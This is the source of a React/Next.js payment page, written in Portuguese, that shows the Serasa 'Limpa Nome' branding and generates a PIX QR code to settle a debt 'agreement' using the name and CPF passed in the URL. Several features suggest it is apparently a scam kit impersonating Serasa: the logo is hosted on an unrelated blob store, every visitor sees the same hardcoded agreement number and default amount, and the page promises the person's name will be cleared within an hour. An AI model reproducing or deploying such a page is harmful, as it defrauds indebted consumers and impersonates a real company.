"use client"

import { useState, useEffect } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Copy, CheckCircle, Clock, AlertCircle, Loader2 } from "lucide-react"

interface PixData {
  txid: string
  amount_cents: number
  pix: {
    copia_e_cola: string
    qr_code_base64: string
    expiration: string
  }
}

export default function PagamentoPage() {
  const searchParams = useSearchParams()
  const nome = searchParams.get("nome") || ""
  const cpf = searchParams.get("cpf") || ""
  const valor = searchParams.get("valor") || "78.47"
  const telefone = searchParams.get("telefone") || "11999999999"
  const email = searchParams.get("email") || ""

  const [pixData, setPixData] = useState<PixData | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<string>("PENDING")
  const [timeLeft, setTimeLeft] = useState<number>(3600)
  const [hasGenerated, setHasGenerated] = useState(false)

  useEffect(() => {
    if (hasGenerated || !nome || !cpf) {
      if (!nome || !cpf) {
        setError("Dados do cliente não encontrados")
        setIsLoading(false)
      }
      return
    }

    const generatePix = async () => {
      setIsLoading(true)
      setError(null)
      setHasGenerated(true)

      try {
        const amountCents = Math.round(parseFloat(valor.replace(",", ".")) * 100)

        const response = await fetch("/api/pix/create", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            amount_cents: amountCents,
            customer_name: nome,
            customer_document: cpf,
            customer_phone: telefone,
            customer_email: email || undefined,
            description: "pagamento seguro",
            external_id: `acordo-${cpf.replace(/\D/g, "")}-${Date.now()}`,
          }),
        })

        const data = await response.json()

        if (!data.success) {
          throw new Error(data.error || "Erro ao gerar PIX")
        }

        setPixData(data)
      } catch (err) {
        console.error("Error generating PIX:", err)
        setError(err instanceof Error ? err.message : "Erro ao gerar PIX")
        setHasGenerated(false)
      } finally {
        setIsLoading(false)
      }
    }

    generatePix()
  }, [nome, cpf, valor, telefone, email, hasGenerated])

  useEffect(() => {
    if (!pixData?.txid) return

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix/status/${pixData.txid}`)
        const data = await response.json()
        
        if (data.success && data.status) {
          setPaymentStatus(data.status)
        }
      } catch (err) {
        console.error("Error checking status:", err)
      }
    }

    const interval = setInterval(checkStatus, 5000)
    return () => clearInterval(interval)
  }, [pixData?.txid])

  useEffect(() => {
    if (paymentStatus !== "PENDING") return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [paymentStatus])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleCopy = async () => {
    if (!pixData?.pix.copia_e_cola) return

    try {
      await navigator.clipboard.writeText(pixData.pix.copia_e_cola)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    } catch (err) {
      console.error("Error copying:", err)
    }
  }

  const formatCurrency = (cents: number) => {
    return (cents / 100).toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    })
  }

  if (paymentStatus === "APPROVED") {
    return (
      <div className="min-h-screen bg-gray-50">
        <header className="bg-pink-600 text-white p-4 shadow-lg">
          <div className="max-w-4xl mx-auto flex items-center gap-3">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
              alt="Serasa"
              width={120}
              height={40}
              className="h-8 w-auto"
            />
            <div className="flex-1">
              <h1 className="font-semibold">Pagamento PIX</h1>
              <p className="text-sm opacity-90">Serasa Limpa Nome</p>
            </div>
          </div>
        </header>

        <div className="max-w-lg mx-auto p-4 mt-8">
          <Card className="p-8 text-center">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle className="w-12 h-12 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">Pagamento Aprovado!</h2>
            <p className="text-gray-600 mb-6">
              Seu pagamento foi confirmado com sucesso. Seu nome será limpo em até 1 hora.
            </p>
            <div className="bg-green-50 rounded-lg p-4 border border-green-200">
              <p className="text-sm text-green-800">
                <strong>Beneficiário:</strong> {nome}
              </p>
              <p className="text-sm text-green-800">
                <strong>CPF:</strong> {cpf}
              </p>
              <p className="text-sm text-green-800">
                <strong>Valor:</strong> {formatCurrency(pixData?.amount_cents || 7847)}
              </p>
            </div>
          </Card>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-pink-600 text-white p-4 shadow-lg">
        <div className="max-w-4xl mx-auto flex items-center gap-3">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
            alt="Serasa"
            width={120}
            height={40}
            className="h-8 w-auto"
          />
          <div className="flex-1">
            <h1 className="font-semibold">Pagamento PIX</h1>
            <p className="text-sm opacity-90">Serasa Limpa Nome</p>
          </div>
        </div>
      </header>

      <div className="max-w-lg mx-auto p-4 mt-4">
        {isLoading ? (
          <Card className="p-8 text-center">
            <Loader2 className="w-12 h-12 text-pink-600 animate-spin mx-auto mb-4" />
            <h2 className="text-xl font-semibold text-gray-800 mb-2">Gerando PIX...</h2>
            <p className="text-gray-600">Aguarde enquanto preparamos seu pagamento</p>
          </Card>
        ) : error ? (
          <Card className="p-8 text-center">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <AlertCircle className="w-8 h-8 text-red-600" />
            </div>
            <h2 className="text-xl font-semibold text-gray-800 mb-2">Erro ao gerar PIX</h2>
            <p className="text-gray-600 mb-4">{error}</p>
            <Button onClick={() => setHasGenerated(false)} className="bg-pink-600 hover:bg-pink-700 text-white">
              Tentar novamente
            </Button>
          </Card>
        ) : pixData ? (
          <div className="space-y-4">
            <Card className="p-6">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold text-gray-800">Pague com PIX</h2>
                <div className="flex items-center gap-2 text-sm text-gray-600">
                  <Clock className="w-4 h-4" />
                  <span>{formatTime(timeLeft)}</span>
                </div>
              </div>

              <div className="bg-pink-50 rounded-lg p-4 mb-4 border border-pink-200">
                <div className="text-center">
                  <p className="text-sm text-gray-600 mb-1">Valor do acordo</p>
                  <p className="text-3xl font-bold text-pink-600">
                    {formatCurrency(pixData.amount_cents)}
                  </p>
                </div>
              </div>

              <div className="flex justify-center mb-6">
                <div className="bg-white p-4 rounded-lg border-2 border-pink-200 shadow-sm">
                  {pixData.pix.qr_code_base64 && (
                    <Image
                      src={pixData.pix.qr_code_base64}
                      alt="QR Code PIX"
                      width={200}
                      height={200}
                      className="w-48 h-48"
                    />
                  )}
                </div>
              </div>

              <div className="text-center mb-4">
                <p className="text-sm text-gray-600 mb-2">
                  Escaneie o QR Code acima ou copie o código abaixo
                </p>
              </div>

              <div className="bg-gray-100 rounded-lg p-3 mb-4">
                <p className="text-xs text-gray-500 mb-2 font-medium">Código Copia e Cola:</p>
                <div className="bg-white rounded border p-2 break-all text-xs text-gray-700 max-h-20 overflow-y-auto">
                  {pixData.pix.copia_e_cola}
                </div>
              </div>

              <Button
                onClick={handleCopy}
                className={`w-full py-6 text-lg font-semibold transition-all ${
                  copied
                    ? "bg-green-600 hover:bg-green-700"
                    : "bg-pink-600 hover:bg-pink-700"
                } text-white`}
              >
                {copied ? (
                  <>
                    <CheckCircle className="w-5 h-5 mr-2" />
                    Código copiado!
                  </>
                ) : (
                  <>
                    <Copy className="w-5 h-5 mr-2" />
                    Copiar código PIX
                  </>
                )}
              </Button>
            </Card>

            <Card className="p-4">
              <h3 className="font-semibold text-gray-800 mb-3">Dados do acordo</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">Beneficiário:</span>
                  <span className="font-medium text-gray-800">{nome}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">CPF:</span>
                  <span className="font-medium text-gray-800">{cpf}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Acordo:</span>
                  <span className="font-medium text-gray-800">83N2L618362E</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Status:</span>
                  <span className="font-medium text-yellow-600 flex items-center gap-1">
                    <div className="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
                    Aguardando pagamento
                  </span>
                </div>
              </div>
            </Card>

            <Card className="p-4 bg-blue-50 border-blue-200">
              <h3 className="font-semibold text-blue-800 mb-2">Como pagar com PIX:</h3>
              <ol className="text-sm text-blue-700 space-y-2">
                <li>1. Abra o app do seu banco</li>
                <li>2. Escolha pagar com PIX</li>
                <li>3. Escaneie o QR Code ou cole o código</li>
                <li>4. Confirme o pagamento</li>
              </ol>
            </Card>

            <div className="text-center text-xs text-gray-500 pb-4">
              <p>Pagamento processado com segurança</p>
              <p>Serasa Limpa Nome - Feirão de Negociação</p>
            </div>
          </div>
        ) : null}
      </div>
    </div>
  )
}
